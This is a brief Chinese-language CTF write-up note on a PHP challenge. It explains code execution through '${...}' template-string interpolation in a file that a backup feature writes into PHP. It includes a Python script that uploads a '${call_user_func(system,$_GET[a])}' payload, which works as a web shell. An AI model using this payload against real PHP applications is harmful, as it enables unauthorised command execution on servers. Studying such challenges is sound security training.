tags:: CTF/PHP/RCE

- # 思路
	- 通过写入PHP文件中的模板字符串进行RCE
- # 模板字符串RCE
	- PHP可以通过类似`"${phpinfo()}"`的语法使用模板字符串，可以用于RCE
	- 最后的脚本
		- ```python
		  # url = "http://127.0.0.1:8082/index.php"
		  url = "http://a4b49755-a407-4c83-8053-8f569ccbb036.node4.buuoj.cn:81"
		  content = "12${var_dump(114514)}3${call_user_func(system,$_GET[a])}"
		  filename = f"aaa.txt"
		  r = base_post(url + "/upload/profile" + "?", files = {
		      "file": (filename, content, "text/plain")
		  })
		  r = base_post(url + "/back/backup" + "?", data = {
		      "filename": filename,
		      "dest": "profile/b.txt"
		  })
		  print(r.text)
		  
		  ```
- # 分析
	- 三个class的功能
		- home: 打印主页和profile文件夹的文件目录
		- upload: 接受上传文件
			- 限制：后缀只能为txt, 大小限制在200k
		- back: 备份文件
			- 通过`htmlspecialchars`后将文件内容写入某个php文件中
			- 支持伪协议？
			- _write: 仅支持指定内容的php文件